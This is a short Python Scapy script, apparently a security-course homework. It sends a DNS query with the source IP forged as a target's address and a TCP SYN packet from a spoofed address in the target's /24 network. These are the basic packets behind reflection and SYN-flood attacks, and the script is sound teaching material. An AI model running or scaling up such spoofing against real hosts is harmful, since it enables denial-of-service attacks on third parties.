import argparse
import scapy.all as scapy

parser = argparse.ArgumentParser(description='MIE-SIB second homework. Use Scapy to send a TCP/SYN packet with a spoofed sender IP address and a DNS query with a spoofed sender IP address. The scrit only work\'s in a class C network (/24)')
parser.add_argument('target', help='The IP address of the target')
parser.add_argument('dns_server', help='The IP address of the DNS server')
args = parser.parse_args()

#Send UDP packet
scapy.send(scapy.IP(src=args.target, dst=args.dns_server)/scapy.UDP(dport=53)/scapy.DNS(rd=1,qd=scapy.DNSQR(qname="www.thepacketgeek.com")),verbose=0)
#Send TCP packet
scapy.send(scapy.IP(src=scapy.Rand(args.target +"/24"), dst=args.target)/scapy.TCP(dport=3333, sport=4444, seq=12, flags="S"))